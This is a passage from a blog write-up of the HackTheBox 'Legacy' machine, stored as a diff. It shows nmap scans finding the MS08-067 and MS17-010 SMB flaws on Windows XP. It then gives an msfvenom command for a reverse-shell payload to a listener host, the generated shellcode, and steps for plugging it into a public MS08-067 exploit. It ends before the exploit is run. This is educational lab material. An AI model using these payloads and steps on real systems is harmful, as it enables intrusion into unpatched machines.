@@ -1,0 +1,182 @@
+I"D)<p><img src="assets/img/legacy-htb/icon.png" alt="" /></p>
+
+<p><strong>Hey Guys!</strong> In this blog-post we are going to pwn <strong>Legacy</strong> from <a href="https://www.hackthebox.eu">HackTheBox</a>.</p>
+
+<p>It is a Windows-based box and is super duper easy.</p>
+
+<p>First, we scan the box to find only 2 services. Then we exploit two infamously popular bugs to get into the system. However, I am not going to use <strong>Metasploit</strong> for exploitation.</p>
+
+<p>With that said, let us begin.</p>
+
+<h1 id="scanning"><a href="#header-1"></a>SCANNING:</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -sC -sV 10.10.10.4
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 09:49 EST
+Nmap scan report for 10.10.10.4
+Host is up (0.26s latency).
+Not shown: 997 filtered ports
+PORT     STATE  SERVICE       VERSION
+139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+3389/tcp closed ms-wbt-server
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: 5d01h04m09s, deviation: 1h24m49s, median: 5d00h04m10s
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:6f:ba (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2021-03-09T18:54:20+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 75.41 seconds
+</code></pre></div></div>
+
+<p>A default script (sC) and service version (sV) NMAP scan reveals ports 139 and 445 to be open.</p>
+
+<p>So we have SMB service running on the box.</p>
+
+<p>Judging by the version of the windows (Windows XP) and SMB service, I decided to do a SMB-vuln scan using NMAP.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap -p139,445 --script smb-vuln* 10.10.10.4
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 09:52 EST
+Nmap scan report for 10.10.10.4
+Host is up (0.26s latency).
+
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds
+</code></pre></div></div>
+
+<p>Our vulnerability scan gives us some useful results. The box is vulnerable to two infamous <strong>SMB Bugs</strong> namely <strong>MS08-067</strong> and <strong>MS17-010</strong>. Any one of the two bugs can be exploitted to get a system-level access on the box.</p>
+
+<p>Both of them have an exploit on <strong>Metasploit</strong>. But let us do the exploitation in a manual way.</p>
+
+<h1 id="exploiting-ms08-067"><a href="#header-1"></a>EXPLOITING MS08-067:</h1>
+
+<p>There are lots of public exploits available for this bug on Github. However, I am going to use <a href="https://github.com/andyacer/ms08_067">this</a>. You can clone the same on your local box.</p>
+
+<p>The only prerequisite for this is : you should have <strong>impacket</strong> version <strong>0.9.17</strong>. This normally comes default with Kali Linux, so you do not need to worry. However, if you do not have, you can get it from <a href="https://github.com/CoreSecurity/impacket/">here</a>.</p>
+
+<p>Now, let us start with the exploitation. First, you need to generate a <strong>reverse shell payload</strong> in order to get a shell. I am using <strong>msfvenom</strong> for the same.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(py2) root@kali:/opt/ms08_067# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of c file: 1488 bytes
+unsigned char buf[] = 
+"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
+"\x4d\xfe\xf4\xee\x83\xee\xfc\xe2\xf4\xb1\x16\x76\xee\x4d\xfe"
+"\x94\x67\xa8\xcf\x34\x8a\xc6\xae\xc4\x65\x1f\xf2\x7f\xbc\x59"
+"\x75\x86\xc6\x42\x49\xbe\xc8\x7c\x01\x58\xd2\x2c\x82\xf6\xc2"
+"\x6d\x3f\x3b\xe3\x4c\x39\x16\x1c\x1f\xa9\x7f\xbc\x5d\x75\xbe"
+"\xd2\xc6\xb2\xe5\x96\xae\xb6\xf5\x3f\x1c\x75\xad\xce\x4c\x2d"
+"\x7f\xa7\x55\x1d\xce\xa7\xc6\xca\x7f\xef\x9b\xcf\x0b\x42\x8c"
+"\x31\xf9\xef\x8a\xc6\x14\x9b\xbb\xfd\x89\x16\x76\x83\xd0\x9b"
+"\xa9\xa6\x7f\xb6\x69\xff\x27\x88\xc6\xf2\xbf\x65\x15\xe2\xf5"
+"\x3d\xc6\xfa\x7f\xef\x9d\x77\xb0\xca\x69\xa5\xaf\x8f\x14\xa4"
+"\xa5\x11\xad\xa1\xab\xb4\xc6\xec\x1f\x63\x10\x96\xc7\xdc\x4d"
+"\xfe\x9c\x99\x3e\xcc\xab\xba\x25\xb2\x83\xc8\x4a\x01\x21\x56"
+"\xdd\xff\xf4\xee\x64\x3a\xa0\xbe\x25\xd7\x74\x85\x4d\x01\x21"
+"\xbe\x1d\xae\xa4\xae\x1d\xbe\xa4\x86\xa7\xf1\x2b\x0e\xb2\x2b"
+"\x63\x84\x48\x96\xfe\xe4\x43\xef\x9c\xec\x4d\xff\x4f\x67\xab"
+"\x94\xe4\xb8\x1a\x96\x6d\x4b\x39\x9f\x0b\x3b\xc8\x3e\x80\xe2"
+"\xb2\xb0\xfc\x9b\xa1\x96\x04\x5b\xef\xa8\x0b\x3b\x25\x9d\x99"
+"\x8a\x4d\x77\x17\xb9\x1a\xa9\xc5\x18\x27\xec\xad\xb8\xaf\x03"
+"\x92\x29\x09\xda\xc8\xef\x4c\x73\xb0\xca\x5d\x38\xf4\xaa\x19"
+"\xae\xa2\xb8\x1b\xb8\xa2\xa0\x1b\xa8\xa7\xb8\x25\x87\x38\xd1"
+"\xcb\x01\x21\x67\xad\xb0\xa2\xa8\xb2\xce\x9c\xe6\xca\xe3\x94"
+"\x11\x98\x45\x14\xf3\x67\xf4\x9c\x48\xd8\x43\x69\x11\x98\xc2"
+"\xf2\x92\x47\x7e\x0f\x0e\x38\xfb\x4f\xa9\x5e\x8c\x9b\x84\x4d"
+"\xad\x0b\x3b";
+</code></pre></div></div>
+
+<p>You have to specify the <strong>LHOST</strong> and <strong>LPORT</strong>. I have specified some bad characters not to use using the <strong>-b</strong> option, the exit function as <strong>thread</strong>, the output format in <strong>C</strong>, the architechture as <strong>32 bit</strong> and finally the platform as <strong>windows</strong> obviously.</p>
+
+<p>Now you need to copy the output and paste it on the <strong>shellcode</strong> variable of the <strong>python</strong> exploit.</p>
+
+<p>After editing, the shellcode will look something like this :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode = b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
+shellcode += b"\x4d\xfe\xf4\xee\x83\xee\xfc\xe2\xf4\xb1\x16\x76\xee\x4d\xfe"
+shellcode += b"\x94\x67\xa8\xcf\x34\x8a\xc6\xae\xc4\x65\x1f\xf2\x7f\xbc\x59"
+shellcode += b"\x75\x86\xc6\x42\x49\xbe\xc8\x7c\x01\x58\xd2\x2c\x82\xf6\xc2"
+shellcode += b"\x6d\x3f\x3b\xe3\x4c\x39\x16\x1c\x1f\xa9\x7f\xbc\x5d\x75\xbe"
+shellcode += b"\xd2\xc6\xb2\xe5\x96\xae\xb6\xf5\x3f\x1c\x75\xad\xce\x4c\x2d"
+shellcode += b"\x7f\xa7\x55\x1d\xce\xa7\xc6\xca\x7f\xef\x9b\xcf\x0b\x42\x8c"
+shellcode += b"\x31\xf9\xef\x8a\xc6\x14\x9b\xbb\xfd\x89\x16\x76\x83\xd0\x9b"
+shellcode += b"\xa9\xa6\x7f\xb6\x69\xff\x27\x88\xc6\xf2\xbf\x65\x15\xe2\xf5"
+shellcode += b"\x3d\xc6\xfa\x7f\xef\x9d\x77\xb0\xca\x69\xa5\xaf\x8f\x14\xa4"
+shellcode += b"\xa5\x11\xad\xa1\xab\xb4\xc6\xec\x1f\x63\x10\x96\xc7\xdc\x4d"
+shellcode += b"\xfe\x9c\x99\x3e\xcc\xab\xba\x25\xb2\x83\xc8\x4a\x01\x21\x56"
+shellcode += b"\xdd\xff\xf4\xee\x64\x3a\xa0\xbe\x25\xd7\x74\x85\x4d\x01\x21"
+shellcode += b"\xbe\x1d\xae\xa4\xae\x1d\xbe\xa4\x86\xa7\xf1\x2b\x0e\xb2\x2b"
+shellcode += b"\x63\x84\x48\x96\xfe\xe4\x43\xef\x9c\xec\x4d\xff\x4f\x67\xab"
+shellcode += b"\x94\xe4\xb8\x1a\x96\x6d\x4b\x39\x9f\x0b\x3b\xc8\x3e\x80\xe2"
+shellcode += b"\xb2\xb0\xfc\x9b\xa1\x96\x04\x5b\xef\xa8\x0b\x3b\x25\x9d\x99"
+shellcode += b"\x8a\x4d\x77\x17\xb9\x1a\xa9\xc5\x18\x27\xec\xad\xb8\xaf\x03"
+shellcode += b"\x92\x29\x09\xda\xc8\xef\x4c\x73\xb0\xca\x5d\x38\xf4\xaa\x19"
+shellcode += b"\xae\xa2\xb8\x1b\xb8\xa2\xa0\x1b\xa8\xa7\xb8\x25\x87\x38\xd1"
+shellcode += b"\xcb\x01\x21\x67\xad\xb0\xa2\xa8\xb2\xce\x9c\xe6\xca\xe3\x94"
+shellcode += b"\x11\x98\x45\x14\xf3\x67\xf4\x9c\x48\xd8\x43\x69\x11\x98\xc2"
+shellcode += b"\xf2\x92\x47\x7e\x0f\x0e\x38\xfb\x4f\xa9\x5e\x8c\x9b\x84\x4d"
+shellcode += b"\xad\x0b\x3b"
+</code></pre></div></div>
+
+<p>Now that it is done, it is time to run the exploit. But before that, we need to specify the exact version of <strong>Windows</strong>.</p>
+
+<p>Since we know it is <strong>Windows XP</strong>, let us begin with option 6 i.e <strong>Windows XP SP3 English (NX)</strong>. If that fails, we can try the other ones.</p>
+
+<p>Also do not forget to set up a netcat listener on the <strong>LPORT</strong> you specified.</p>
+
+:ET
